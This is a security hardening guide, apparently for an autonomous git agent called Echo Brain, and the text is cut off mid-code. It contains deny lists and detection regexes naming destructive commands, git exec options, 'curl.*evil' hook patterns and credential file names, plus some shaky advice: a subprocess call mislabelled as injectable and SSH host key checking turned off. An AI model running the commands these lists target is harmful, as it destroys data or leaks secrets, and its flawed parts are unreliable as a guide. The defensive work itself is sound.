# Echo Brain Git Security Implementation Guide

**Document Version**: 1.0
**Date**: 2025-12-17
**Priority**: CRITICAL - IMMEDIATE ACTION REQUIRED

## Executive Summary

This document provides concrete implementation guidance for securing Echo Brain's git operations. Based on the security architecture analysis, this guide includes specific code examples, configuration changes, and step-by-step implementation instructions.

## Critical Security Fixes (IMMEDIATE)

### 1. Fix Command Injection Vulnerabilities

**CURRENT VULNERABLE CODE** in `/opt/tower-echo-brain/src/execution/git_operations.py`:

```python
# VULNERABLE - Lines 87-92
def _run_git(self, *args, check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(self.repo_path)] + list(args),
        capture_output=True, text=True, check=check
    )
```

**SECURE REPLACEMENT**:

```python
import shlex
from pathlib import Path
from typing import List, Optional, Tuple
import logging

class SecureGitExecutor:
    """Secure git command execution with input validation and sandboxing."""

    ALLOWED_COMMANDS = {
        'status': {'args': ['--porcelain', '--branch'], 'max_args': 2},
        'add': {'args': ['.', '-A', '-u'], 'max_args': 10},
        'commit': {'args': ['-m'], 'max_args': 3},
        'push': {'args': ['-u', 'origin'], 'max_args': 5},
        'pull': {'args': ['--rebase'], 'max_args': 3},
        'checkout': {'args': ['-b'], 'max_args': 3},
        'branch': {'args': ['--show-current', '--list'], 'max_args': 2},
        'log': {'args': ['--oneline', '--pretty=format:%h %s'], 'max_args': 5},
        'diff': {'args': ['--name-only', '--cached', '--stat'], 'max_args': 5}
    }

    DANGEROUS_PATTERNS = [
        r'[;&|`$()]',  # Shell metacharacters
        r'\.\./',      # Path traversal
        r'rm\s+-rf',   # Destructive operations
        r'--upload-pack',  # Dangerous git options
        r'--exec',
        r'--receive-pack'
    ]

    def __init__(self, repo_path: Path, logger: logging.Logger):
        self.repo_path = repo_path.resolve()  # Resolve to absolute path
        self.logger = logger

        # Validate repository path
        if not self._is_valid_repo_path(self.repo_path):
            raise ValueError(f"Invalid repository path: {self.repo_path}")

    def _is_valid_repo_path(self, path: Path) -> bool:
        """Validate repository path is within allowed directories."""
        allowed_prefixes = [
            Path("/opt/tower-"),
            Path("/home/patrick/Documents/Tower"),
            Path("/tmp/claude/git-")
        ]

        try:
            resolved_path = path.resolve()
            return any(
                str(resolved_path).startswith(str(prefix.resolve()))
                for prefix in allowed_prefixes
            )
        except Exception:
            return False

    def _validate_command(self, command: str, args: List[str]) -> bool:
        """Validate git command and arguments against whitelist."""
        if command not in self.ALLOWED_COMMANDS:
            self.logger.warning(f"Blocked unauthorized git command: {command}")
            return False

        allowed_config = self.ALLOWED_COMMANDS[command]

        # Check argument count
        if len(args) > allowed_config['max_args']:
            self.logger.warning(f"Blocked git {command}: too many arguments")
            return False

        # Validate each argument
        for arg in args:
            if self._contains_dangerous_patterns(arg):
                self.logger.warning(f"Blocked dangerous argument: {arg}")
                return False

            # For file paths, validate they're within repo
            if not arg.startswith('-') and '/' in arg:
                if not self._is_valid_file_path(arg):
                    return False

        return True

    def _contains_dangerous_patterns(self, arg: str) -> bool:
        """Check argument for dangerous patterns."""
        import re
        for pattern in self.DANGEROUS_PATTERNS:
            if re.search(pattern, arg):
                return True
        return False

    def _is_valid_file_path(self, file_path: str) -> bool:
        """Validate file path is within repository."""
        try:
            full_path = (self.repo_path / file_path).resolve()
            return str(full_path).startswith(str(self.repo_path))
        except Exception:
            return False

    async def execute_git_command(self, command: str, args: List[str]) -> Dict[str, Any]:
        """Execute git command with full security validation."""
        start_time = datetime.now()

        # Validate command
        if not self._validate_command(command, args):
            return {
                'success': False,
                'error': 'Command validation failed',
                'stdout': '',
                'stderr': 'Security policy violation',
                'execution_time': 0
            }

        # Build command
        cmd = ['git', '-C', str(self.repo_path), command] + args

        try:
            # Execute with timeout and resource limits
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=self.repo_path
            )

            # Wait with timeout
            stdout, stderr = await asyncio.wait_for(
                process.communicate(), timeout=30
            )

            execution_time = (datetime.now() - start_time).total_seconds()

            result = {
                'success': process.returncode == 0,
                'returncode': process.returncode,
                'stdout': stdout.decode('utf-8'),
                'stderr': stderr.decode('utf-8'),
                'execution_time': execution_time,
                'command': ' '.join(cmd[3:])  # Don't log full path
            }

            # Log the operation
            await self._log_git_operation(command, args, result)

            return result

        except asyncio.TimeoutError:
            self.logger.error(f"Git command timeout: {command}")
            return {
                'success': False,
                'error': 'Command timeout',
                'stdout': '',
                'stderr': 'Operation timed out after 30 seconds',
                'execution_time': 30
            }
        except Exception as e:
            self.logger.error(f"Git command error: {e}")
            return {
                'success': False,
                'error': str(e),
                'stdout': '',
                'stderr': f'Execution error: {e}',
                'execution_time': (datetime.now() - start_time).total_seconds()
            }

    async def _log_git_operation(self, command: str, args: List[str], result: Dict[str, Any]):
        """Log git operation for audit trail."""
        audit_entry = {
            'timestamp': datetime.now().isoformat(),
            'repository': str(self.repo_path.name),
            'command': command,
            'args': args,
            'success': result['success'],
            'execution_time': result['execution_time'],
            'user': 'echo_brain_autonomous'
        }

        # Store in audit log
        self.logger.info(f"Git operation: {audit_entry}")
        # TODO: Store in database for compliance
```

### 2. Secure Credential Storage

**CURRENT VULNERABLE CONFIG** in `/opt/tower-echo-brain/.env`:

```bash
# VULNERABLE - Plain text credentials
DB_PASSWORD=***REMOVED***
```

**SECURE REPLACEMENT** using Python keyring:

```python
import keyring
import os
from cryptography.fernet import Fernet
from pathlib import Path
import json

class SecureCredentialManager:
    """Secure credential storage using system keyring and encryption."""

    def __init__(self):
        self.service_name = "tower-echo-brain"
        self.key_file = Path("/opt/tower-echo-brain/.encryption_key")
        self._ensure_encryption_key()

    def _ensure_encryption_key(self):
        """Ensure encryption key exists or create new one."""
        if not self.key_file.exists():
            key = Fernet.generate_key()
            # Store key with restricted permissions
            self.key_file.write_bytes(key)
            os.chmod(self.key_file, 0o600)

    def _get_cipher(self) -> Fernet:
        """Get encryption cipher."""
        key = self.key_file.read_bytes()
        return Fernet(key)

    def store_credential(self, credential_name: str, credential_value: str) -> bool:
        """Store credential securely in system keyring."""
        try:
            # Encrypt credential
            cipher = self._get_cipher()
            encrypted_value = cipher.encrypt(credential_value.encode())

            # Store in system keyring
            keyring.set_password(
                self.service_name,
                credential_name,
                encrypted_value.decode()
            )

            return True
        except Exception as e:
            logging.error(f"Failed to store credential {credential_name}: {e}")
            return False

    def retrieve_credential(self, credential_name: str) -> Optional[str]:
        """Retrieve credential securely from system keyring."""
        try:
            # Get encrypted credential
            encrypted_value = keyring.get_password(self.service_name, credential_name)
            if not encrypted_value:
                return None

            # Decrypt credential
            cipher = self._get_cipher()
            decrypted_value = cipher.decrypt(encrypted_value.encode())

            return decrypted_value.decode()
        except Exception as e:
            logging.error(f"Failed to retrieve credential {credential_name}: {e}")
            return None

    def rotate_credential(self, credential_name: str, new_value: str) -> bool:
        """Rotate credential with validation."""
        # Store new credential
        backup_key = f"{credential_name}_backup"
        old_value = self.retrieve_credential(credential_name)

        if old_value:
            self.store_credential(backup_key, old_value)

        success = self.store_credential(credential_name, new_value)

        if success:
            # Test new credential
            if self._validate_credential(credential_name, new_value):
                # Remove backup
                keyring.delete_password(self.service_name, backup_key)
                return True
            else:
                # Restore backup
                if old_value:
                    self.store_credential(credential_name, old_value)
                    keyring.delete_password(self.service_name, backup_key)
                return False

        return False

    def _validate_credential(self, credential_name: str, credential_value: str) -> bool:
        """Validate credential works for its intended purpose."""
        if credential_name == "db_password":
            return self._test_database_connection(credential_value)
        elif credential_name == "github_token":
            return self._test_github_token(credential_value)
        return True

    def _test_database_connection(self, password: str) -> bool:
        """Test database connection with new password."""
        import psycopg2
        try:
            conn = psycopg2.connect(
                host="localhost",
                database="echo_brain",
                user="patrick",
                password=password
            )
            conn.close()
            return True
        except:
            return False

    def _test_github_token(self, token: str) -> bool:
        """Test GitHub token validity."""
        import requests
        try:
            response = requests.get(
                "https://api.github.com/user",
                headers={"Authorization": f"token {token}"}
            )
            return response.status_code == 200
        except:
            return False

# Migration script to secure existing credentials
async def migrate_credentials_to_secure_storage():
    """Migrate existing plain-text credentials to secure storage."""
    credential_manager = SecureCredentialManager()

    # Read existing .env file
    env_file = Path("/opt/tower-echo-brain/.env")
    if env_file.exists():
        env_content = env_file.read_text()

        # Extract credentials
        credentials_to_migrate = [
            "DB_PASSWORD",
            "GITHUB_TOKEN",
            "ENCRYPTION_KEY"
        ]

        for cred_name in credentials_to_migrate:
            for line in env_content.split('\n'):
                if line.startswith(f"{cred_name}="):
                    value = line.split('=', 1)[1]
                    credential_manager.store_credential(cred_name.lower(), value)
                    print(f"Migrated {cred_name} to secure storage")

        # Create new .env with references to secure storage
        new_env_content = """# Echo Brain Database Configuration - Secure
# Credentials stored in system keyring
DB_NAME=echo_brain
DB_USER=patrick
DB_HOST=localhost
DB_PORT=5432

# Security settings
USE_VAULT=true
CREDENTIAL_STORAGE=keyring

# Qdrant vector database
QDRANT_HOST=localhost
QDRANT_PORT=6333
"""

        # Backup original
        env_file.rename(env_file.with_suffix('.env.backup'))
        env_file.write_text(new_env_content)

        print("Credential migration completed. Original .env backed up.")
```

### 3. SSH Key Management

```python
import paramiko
from pathlib import Path
import subprocess
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519

class SSHKeyManager:
    """Manage SSH keys for git operations."""

    def __init__(self, key_dir: Path = Path("/opt/tower-echo-brain/.ssh")):
        self.key_dir = key_dir
        self.key_dir.mkdir(mode=0o700, exist_ok=True)

    def generate_deploy_key(self, repo_name: str) -> Tuple[str, str]:
        """Generate ED25519 key pair for repository."""
        # Generate private key
        private_key = ed25519.Ed25519PrivateKey.generate()

        # Serialize private key
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.OpenSSH,
            encryption_algorithm=serialization.NoEncryption()
        )

        # Get public key
        public_key = private_key.public_key()
        public_ssh = public_key.public_bytes(
            encoding=serialization.Encoding.OpenSSH,
            format=serialization.PublicFormat.OpenSSH
        )

        # Save keys
        key_name = f"id_ed25519_{repo_name}"
        private_key_path = self.key_dir / key_name
        public_key_path = self.key_dir / f"{key_name}.pub"

        private_key_path.write_bytes(private_pem)
        private_key_path.chmod(0o600)

        public_key_path.write_bytes(public_ssh + b" echo-brain-deploy")
        public_key_path.chmod(0o644)

        return str(private_key_path), public_ssh.decode()

    def rotate_ssh_key(self, repo_name: str) -> bool:
        """Rotate SSH key for repository."""
        try:
            # Generate new key
            private_key_path, public_key = self.generate_deploy_key(f"{repo_name}_new")

            # Test new key (would need GitHub API integration)
            if self._test_ssh_key(private_key_path, repo_name):
                # Replace old key
                old_private = self.key_dir / f"id_ed25519_{repo_name}"
                old_public = self.key_dir / f"id_ed25519_{repo_name}.pub"

                new_private = self.key_dir / f"id_ed25519_{repo_name}_new"
                new_public = self.key_dir / f"id_ed25519_{repo_name}_new.pub"

                # Backup old keys
                if old_private.exists():
                    old_private.rename(self.key_dir / f"id_ed25519_{repo_name}_backup")
                    old_public.rename(self.key_dir / f"id_ed25519_{repo_name}_backup.pub")

                # Move new keys to active
                new_private.rename(old_private)
                new_public.rename(old_public)

                return True
            else:
                # Clean up failed attempt
                Path(private_key_path).unlink(missing_ok=True)
                Path(f"{private_key_path}.pub").unlink(missing_ok=True)
                return False

        except Exception as e:
            logging.error(f"SSH key rotation failed: {e}")
            return False

    def _test_ssh_key(self, private_key_path: str, repo_name: str) -> bool:
        """Test SSH key against repository."""
        try:
            # Test git ls-remote with new key
            result = subprocess.run([
                "ssh", "-i", private_key_path,
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "git@github.com", f"git ls-remote git@github.com:tower/{repo_name}.git"
            ], capture_output=True, timeout=10)

            return result.returncode == 0
        except:
            return False
```

## Access Control Implementation

### Role-Based Access Control (RBAC) System

```python
from enum import Enum
from dataclasses import dataclass
from typing import List, Dict, Set, Optional
import asyncio
import logging

class GitPermission(Enum):
    READ_REPO = "read_repo"
    WRITE_REPO = "write_repo"
    CREATE_BRANCH = "create_branch"
    CREATE_PR = "create_pr"
    MERGE_PR = "merge_pr"
    DELETE_BRANCH = "delete_branch"
    FORCE_PUSH = "force_push"
    ADMIN = "admin"

class GitRole(Enum):
    AUTONOMOUS_AGENT = "autonomous_agent"
    DEVELOPMENT_AGENT = "development_agent"
    RELEASE_AGENT = "release_agent"
    ADMIN = "admin"

@dataclass
class AccessPolicy:
    """Repository access policy configuration."""
    repository: str
    default_role: GitRole
    protected_branches: List[str]
    auto_merge_enabled: bool
    required_reviews: int
    max_file_size_mb: int = 100
    allowed_file_types: Set[str] = None

class GitAccessController:
    """Enforces access control for git operations."""

    ROLE_PERMISSIONS = {
        GitRole.AUTONOMOUS_AGENT: {
            GitPermission.READ_REPO,
            GitPermission.CREATE_BRANCH,
            GitPermission.CREATE_PR
        },
        GitRole.DEVELOPMENT_AGENT: {
            GitPermission.READ_REPO,
            GitPermission.WRITE_REPO,
            GitPermission.CREATE_BRANCH,
            GitPermission.CREATE_PR,
            GitPermission.DELETE_BRANCH
        },
        GitRole.RELEASE_AGENT: {
            GitPermission.READ_REPO,
            GitPermission.WRITE_REPO,
            GitPermission.CREATE_BRANCH,
            GitPermission.CREATE_PR,
            GitPermission.MERGE_PR
        },
        GitRole.ADMIN: set(GitPermission)
    }

    REPOSITORY_POLICIES = {
        "tower-echo-brain": AccessPolicy(
            repository="tower-echo-brain",
            default_role=GitRole.AUTONOMOUS_AGENT,
            protected_branches=["main", "production"],
            auto_merge_enabled=False,
            required_reviews=1,
            max_file_size_mb=50,
            allowed_file_types={".py", ".md", ".yaml", ".json"}
        ),
        "tower-dashboard": AccessPolicy(
            repository="tower-dashboard",
            default_role=GitRole.DEVELOPMENT_AGENT,
            protected_branches=["main"],
            auto_merge_enabled=True,
            required_reviews=0,
            max_file_size_mb=25,
            allowed_file_types={".py", ".vue", ".js", ".ts", ".css", ".md"}
        )
    }

    def __init__(self, audit_logger: logging.Logger):
        self.audit_logger = audit_logger
        self.user_roles: Dict[str, GitRole] = {}

    async def check_permission(
        self,
        user_id: str,
        permission: GitPermission,
        repository: str,
        branch: str = None,
        files: List[str] = None
    ) -> Tuple[bool, str]:
        """Check if user has permission for git operation."""

        # Get user role for repository
        user_role = self.get_user_role(user_id, repository)

        # Check basic permission
        if permission not in self.ROLE_PERMISSIONS[user_role]:
            await self._log_access_denied(user_id, permission, repository,
                                        "Insufficient role permissions")
            return False, f"Role {user_role.value} lacks {permission.value} permission"

        # Check repository-specific policies
        policy = self.REPOSITORY_POLICIES.get(repository)
        if policy:
            # Check protected branch restrictions
            if branch and branch in policy.protected_branches:
                if permission in {GitPermission.FORCE_PUSH, GitPermission.DELETE_BRANCH}:
                    await self._log_access_denied(user_id, permission, repository,
                                                f"Operation blocked on protected branch: {branch}")
                    return False, f"Operation not allowed on protected branch: {branch}"

            # Check file restrictions
            if files and permission == GitPermission.WRITE_REPO:
                file_check_result = self._check_file_restrictions(files, policy)
                if not file_check_result[0]:
                    await self._log_access_denied(user_id, permission, repository,
                                                f"File restriction violation: {file_check_result[1]}")
                    return file_check_result

        await self._log_access_granted(user_id, permission, repository)
        return True, "Access granted"

    def get_user_role(self, user_id: str, repository: str) -> GitRole:
        """Get effective user role for repository."""
        # Check user-specific role
        if user_id in self.user_roles:
            return self.user_roles[user_id]

        # Fall back to repository default
        policy = self.REPOSITORY_POLICIES.get(repository)
        if policy:
            return policy.default_role

        # System default
        return GitRole.AUTONOMOUS_AGENT

    def _check_file_restrictions(self, files: List[str], policy: AccessPolicy) -> Tuple[bool, str]:
        """Check file restrictions against policy."""
        for file_path in files:
            # Check file extension
            if policy.allowed_file_types:
                file_ext = Path(file_path).suffix.lower()
                if file_ext and file_ext not in policy.allowed_file_types:
                    return False, f"File type {file_ext} not allowed in repository"

            # Check file size (would need actual file to check)
            # This is a placeholder - real implementation would check actual file size
            pass

        return True, "File restrictions passed"

    async def _log_access_granted(self, user_id: str, permission: GitPermission, repository: str):
        """Log successful access."""
        self.audit_logger.info({
            "event": "git_access_granted",
            "user_id": user_id,
            "permission": permission.value,
            "repository": repository,
            "timestamp": datetime.now().isoformat()
        })

    async def _log_access_denied(self, user_id: str, permission: GitPermission,
                               repository: str, reason: str):
        """Log denied access attempt."""
        self.audit_logger.warning({
            "event": "git_access_denied",
            "user_id": user_id,
            "permission": permission.value,
            "repository": repository,
            "reason": reason,
            "timestamp": datetime.now().isoformat()
        })
```

## Audit and Monitoring System

```python
import json
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
from collections import defaultdict

@dataclass
class GitAuditEvent:
    """Git operation audit event."""
    event_id: str
    timestamp: datetime
    user_id: str
    operation: str
    repository: str
    branch: str
    files_affected: List[str]
    command_executed: str
    success: bool
    error_message: Optional[str]
    commit_hash: Optional[str]
    pr_number: Optional[int]
    execution_time_ms: float
    source_ip: Optional[str]
    user_agent: Optional[str]

class GitAuditLogger:
    """Comprehensive audit logging for git operations."""

    def __init__(self, database_conn, siem_endpoint: Optional[str] = None):
        self.database = database_conn
        self.siem_endpoint = siem_endpoint
        self.event_buffer: List[GitAuditEvent] = []
        self.buffer_size = 100
        self.anomaly_detector = GitAnomalyDetector()

    async def log_git_operation(self, event: GitAuditEvent) -> None:
        """Log git operation with full audit trail."""

        # Add to buffer
        self.event_buffer.append(event)

        # Store in database
        await self._store_event_in_database(event)

        # Check for anomalies
        anomalies = await self.anomaly_detector.analyze_event(event)
        if anomalies:
            await self._handle_anomalies(event, anomalies)

        # Send to SIEM if configured
        if self.siem_endpoint:
            await self._send_to_siem(event)

        # Flush buffer if full
        if len(self.event_buffer) >= self.buffer_size:
            await self._flush_buffer()

    async def _store_event_in_database(self, event: GitAuditEvent) -> None:
        """Store audit event in database."""
        query = """
        INSERT INTO git_audit_events (
            event_id, timestamp, user_id, operation, repository, branch,
            files_affected, command_executed, success, error_message,
            commit_hash, pr_number, execution_time_ms, source_ip, user_agent
        ) VALUES (
            %(event_id)s, %(timestamp)s, %(user_id)s, %(operation)s,
            %(repository)s, %(branch)s, %(files_affected)s, %(command_executed)s,
            %(success)s, %(error_message)s, %(commit_hash)s, %(pr_number)s,
            %(execution_time_ms)s, %(source_ip)s, %(user_agent)s
        )
        """

        params = asdict(event)
        params['files_affected'] = json.dumps(event.files_affected)

        async with self.database.acquire() as conn:
            await conn.execute(query, params)

    async def _send_to_siem(self, event: GitAuditEvent) -> None:
        """Send event to SIEM system."""
        import aiohttp

        payload = {
            "timestamp": event.timestamp.isoformat(),
            "source": "echo-brain-git",
            "event_type": "git_operation",
            "severity": "high" if not event.success else "info",
            "data": asdict(event)
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.siem_endpoint, json=payload) as response:
                    if response.status != 200:
                        logging.error(f"Failed to send event to SIEM: {response.status}")
        except Exception as e:
            logging.error(f"SIEM transmission error: {e}")

    async def _handle_anomalies(self, event: GitAuditEvent, anomalies: List[str]) -> None:
        """Handle detected anomalies."""
        for anomaly in anomalies:
            # Log security event
            logging.warning(f"Git security anomaly detected: {anomaly} for event {event.event_id}")

            # Store anomaly record
            await self._store_anomaly(event, anomaly)

            # Send alert if critical
            if "critical" in anomaly.lower():
                await self._send_security_alert(event, anomaly)

    async def generate_audit_report(
        self,
        start_date: datetime,
        end_date: datetime,
        repository: Optional[str] = None
    ) -> Dict[str, Any]:
        """Generate comprehensive audit report."""

        base_query = """
        SELECT * FROM git_audit_events
        WHERE timestamp BETWEEN %(start_date)s AND %(end_date)s
        """

        params = {"start_date": start_date, "end_date": end_date}

        if repository:
            base_query += " AND repository = %(repository)s"
            params["repository"] = repository

        async with self.database.acquire() as conn:
            events = await conn.fetch(base_query + " ORDER BY timestamp", params)

        # Analyze events
        total_operations = len(events)
        successful_operations = sum(1 for e in events if e['success'])
        failed_operations = total_operations - successful_operations

        operations_by_user = defaultdict(int)
        operations_by_repo = defaultdict(int)
        operations_by_type = defaultdict(int)

        for event in events:
            operations_by_user[event['user_id']] += 1
            operations_by_repo[event['repository']] += 1
            operations_by_type[event['operation']] += 1

        return {
            "period": f"{start_date.isoformat()} to {end_date.isoformat()}",
            "summary": {
                "total_operations": total_operations,
                "successful_operations": successful_operations,
                "failed_operations": failed_operations,
                "success_rate": successful_operations / max(total_operations, 1)
            },
            "breakdown": {
                "by_user": dict(operations_by_user),
                "by_repository": dict(operations_by_repo),
                "by_operation_type": dict(operations_by_type)
            },
            "security_events": await self._get_security_events(start_date, end_date)
        }

class GitAnomalyDetector:
    """Detect anomalous git operation patterns."""

    def __init__(self):
        self.baseline_metrics = {}
        self.suspicious_patterns = [
            r'force-push',
            r'reset.*--hard',
            r'rm.*-rf',
            r'rebase.*-i',
            r'filter-branch'
        ]

    async def analyze_event(self, event: GitAuditEvent) -> List[str]:
        """Analyze event for anomalies."""
        anomalies = []

        # Check for suspicious commands
        for pattern in self.suspicious_patterns:
            import re
            if re.search(pattern, event.command_executed, re.IGNORECASE):
                anomalies.append(f"Suspicious command pattern: {pattern}")

        # Check for unusual timing
        if event.execution_time_ms > 30000:  # 30 seconds
            anomalies.append(f"Unusually long execution time: {event.execution_time_ms}ms")

        # Check for rapid successive operations
        if await self._check_rapid_operations(event):
            anomalies.append("Rapid successive operations detected")

        # Check for unusual file patterns
        if event.files_affected:
            if len(event.files_affected) > 100:
                anomalies.append(f"Large number of files affected: {len(event.files_affected)}")

            for file_path in event.files_affected:
                if self._is_sensitive_file(file_path):
                    anomalies.append(f"Modification to sensitive file: {file_path}")

        return anomalies

    async def _check_rapid_operations(self, event: GitAuditEvent) -> bool:
        """Check for rapid successive operations by same user."""
        # This would query recent events by the same user
        # Implementation depends on database structure
        return False

    def _is_sensitive_file(self, file_path: str) -> bool:
        """Check if file is considered sensitive."""
        sensitive_patterns = [
            r'\.env',
            r'\.key',
            r'\.pem',
            r'password',
            r'secret',
            r'credential'
        ]

        import re
        for pattern in sensitive_patterns:
            if re.search(pattern, file_path, re.IGNORECASE):
                return True
        return False

class GitForensicsAnalyzer:
    """Forensic analysis capabilities for git security incidents."""

    def __init__(self, database_conn):
        self.database = database_conn

    async def trace_commit_origin(self, commit_hash: str) -> Dict[str, Any]:
        """Trace commit back to original author and system."""

        # Query audit logs for commit
        query = """
        SELECT * FROM git_audit_events
        WHERE commit_hash = %(commit_hash)s
        ORDER BY timestamp
        """

        async with self.database.acquire() as conn:
            events = await conn.fetch(query, {"commit_hash": commit_hash})

        if not events:
            return {"error": "No audit trail found for commit"}

        commit_event = events[0]

        # Analyze commit metadata
        git_log_result = await self._execute_git_command([
            "log", "--format=fuller", "-1", commit_hash
        ])

        return {
            "commit_hash": commit_hash,
            "audit_trail": [dict(event) for event in events],
            "git_metadata": git_log_result,
            "origin_analysis": {
                "user_id": commit_event['user_id'],
                "source_ip": commit_event['source_ip'],
                "timestamp": commit_event['timestamp'],
                "command_used": commit_event['command_executed']
            }
        }

    async def analyze_repository_integrity(self, repository_path: str) -> Dict[str, Any]:
        """Check repository integrity and detect tampering."""

        integrity_checks = {
            "git_fsck": await self._run_git_fsck(repository_path),
            "ref_integrity": await self._check_ref_integrity(repository_path),
            "object_verification": await self._verify_objects(repository_path),
            "hook_analysis": await self._analyze_git_hooks(repository_path)
        }

        overall_integrity = all(check.get("clean", False) for check in integrity_checks.values())

        return {
            "repository": repository_path,
            "integrity_status": "clean" if overall_integrity else "compromised",
            "checks": integrity_checks,
            "recommendations": self._generate_integrity_recommendations(integrity_checks)
        }

    async def _run_git_fsck(self, repo_path: str) -> Dict[str, Any]:
        """Run git fsck to check repository integrity."""
        result = await self._execute_git_command(["fsck", "--full"], repo_path)

        return {
            "clean": result["success"] and not result["stderr"],
            "output": result["stdout"],
            "errors": result["stderr"]
        }

    async def _check_ref_integrity(self, repo_path: str) -> Dict[str, Any]:
        """Check integrity of git references."""
        # Implementation would check .git/refs structure
        return {"clean": True, "refs_checked": 0}

    async def _verify_objects(self, repo_path: str) -> Dict[str, Any]:
        """Verify git object integrity."""
        # Implementation would verify object hashes
        return {"clean": True, "objects_verified": 0}

    async def _analyze_git_hooks(self, repo_path: str) -> Dict[str, Any]:
        """Analyze git hooks for malicious code."""
        hooks_dir = Path(repo_path) / ".git" / "hooks"

        if not hooks_dir.exists():
            return {"clean": True, "hooks_analyzed": 0}

        suspicious_patterns = [
            r'curl.*evil',
            r'wget.*malware',
            r'rm.*-rf.*/',
            r'chmod.*777'
        ]

        suspicious_hooks = []

        for hook_file in hooks_dir.iterdir():
            if hook_file.is_file() and not hook_file.name.endswith('.sample'):
                content = hook_file.read_text()

                import re
                for pattern in suspicious_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        suspicious_hooks.append({
                            "file": hook_file.name,
                            "pattern": pattern,
                            "content_preview": content[:200]
                        })

        return {
            "clean": len(suspicious_hooks) == 0,
            "hooks_analyzed": len(list(hooks_dir.iterdir())),
            "suspicious_hooks": suspicious_hooks
        }
```

## Secure Execution Environment

```python
import docker
import tempfile
import json
from pathlib import Path
import asyncio
from typing import Dict, Any, Optional
import resource
import signal

class DockerGitSandbox:
    """Docker-based secure execution environment for git operations."""

    def __init__(self):
        self.docker_client = docker.from_env()
        self.base_image = "alpine/git:latest"
        self.container_timeout = 300  # 5 minutes max
        self.memory_limit = "256m"
        self.cpu_limit = "0.5"

    async def execute_git_operation(
        self,
        operation: str,
        args: List[str],
        repo_path: Path,
        user_id: str
    ) -> Dict[str, Any]:
        """Execute git operation in secure Docker container."""

        # Create temporary workspace
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)

            # Copy repository to workspace (read-only)
            import shutil
            repo_copy = workspace / "repo"
            shutil.copytree(repo_path, repo_copy)

            # Create execution script
            script_content = self._generate_execution_script(operation, args)
            script_path = workspace / "execute.sh"
            script_path.write_text(script_content)
            script_path.chmod(0o755)

            try:
                # Run in Docker container
                result = await self._run_container(workspace, user_id)

                # Copy results back if needed
                if result["success"] and operation in ["commit", "add"]:
                    await self._sync_changes_back(repo_copy, repo_path)

                return result

            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "stdout": "",
                    "stderr": f"Container execution failed: {e}"
                }

    def _generate_execution_script(self, operation: str, args: List[str]) -> str:
        """Generate secure execution script."""

        # Validate and sanitize arguments
        sanitized_args = [arg for arg in args if self._is_safe_argument(arg)]

        script = f"""#!/bin/sh
set -e

cd /workspace/repo

# Set git config for container
git config --global user.email "echo-brain@tower.local"
git config --global user.name "Echo Brain"

# Execute git operation
git {operation} {' '.join(sanitized_args)}

echo "Operation completed successfully"
"""
        return script

    def _is_safe_argument(self, arg: str) -> bool:
        """Validate git argument is safe."""
        dangerous_patterns = [
            r'[;&|`$()]',
            r'\.\./',
            r'--upload-pack',
            r'--exec'
        ]

        import re
        for pattern in dangerous_patterns:
            if re.search(pattern, arg):
                return False
        return True

    async def _run_container(self, workspace: Path, user_id: str) -> Dict[str, Any]:
        """Run Docker container with security restrictions."""

        container_config = {
            "image": self.base_image,
            "command": ["/workspace/execute.sh"],
            "volumes": {str(workspace): {"bind": "/workspace", "mode": "rw"}},
            "mem_limit": self.memory_limit,
            "cpu_quota": int(50000),  # 0.5 CPU
            "cpu_period": 100000,
            "network_mode": "none",  # No network access
            "user": "nobody",  # Run as non-root
            "read_only": True,
            "tmpfs": {"/tmp": "size=50m"},
            "security_opt": ["no-new-privileges:true"],
            "cap_drop": ["ALL"],
            "cap_add": ["DAC_OVERRIDE"]  # Only what's needed for git
        }

        try:
            container = self.docker_client.containers.run(
                detach=True,
                **container_config
            )

            # Wait for completion with timeout
            result = await asyncio.wait_for(
                self._wait_for_container(container),
                timeout=self.container_timeout
            )

            return result

        except asyncio.TimeoutError:
            # Kill container if timeout
            container.kill()
            container.remove()
            return {
                "success": False,
                "error": "Operation timeout",
                "stdout": "",
                "stderr": "Container execution timed out"
            }

    async def _wait_for_container(self, container) -> Dict[str, Any]:
        """Wait for container completion."""

        # Wait for container to finish
        exit_status = container.wait()

        # Get logs
        stdout = container.logs(stdout=True, stderr=False).decode('utf-8')
        stderr = container.logs(stdout=False, stderr=True).decode('utf-8')

        # Clean up
        container.remove()

        return {
            "success": exit_status["StatusCode"] == 0,
            "exit_code": exit_status["StatusCode"],
            "stdout": stdout,
            "stderr": stderr
        }

class ResourceLimitedExecutor:
    """Execute git operations with system resource limits."""

    def __init__(self):
        self.max_memory = 100 * 1024 * 1024  # 100MB
        self.max_cpu_time = 60  # 60 seconds
        self.max_processes = 5

    async def execute_with_limits(
        self,
        command: List[str],
        cwd: Path
    ) -> Dict[str, Any]:
        """Execute command with strict resource limits."""

        def preexec_fn():
            """Set resource limits before execution."""
            # Memory limit
            resource.setrlimit(resource.RLIMIT_AS, (self.max_memory, self.max_memory))

            # CPU time limit
            resource.setrlimit(resource.RLIMIT_CPU, (self.max_cpu_time, self.max_cpu_time))

            # Process limit
            resource.setrlimit(resource.RLIMIT_NPROC, (self.max_processes, self.max_processes))

            # File size limit (prevent large file creation)
            resource.setrlimit(resource.RLIMIT_FSIZE, (50*1024*1024, 50*1024*1024))

        try:
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=cwd,
                preexec_fn=preexec_fn
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=self.max_cpu_time
            )

            return {
                "success": process.returncode == 0,
                "returncode": process.returncode,
                "stdout": stdout.decode('utf-8'),
                "stderr": stderr.decode('utf-8')
            }

        except asyncio.TimeoutError:
            # Kill process if timeout
            try:
                process.kill()
                await process.wait()
            except:
                pass

            return {
                "success": False,
                "error": "Command timeout",
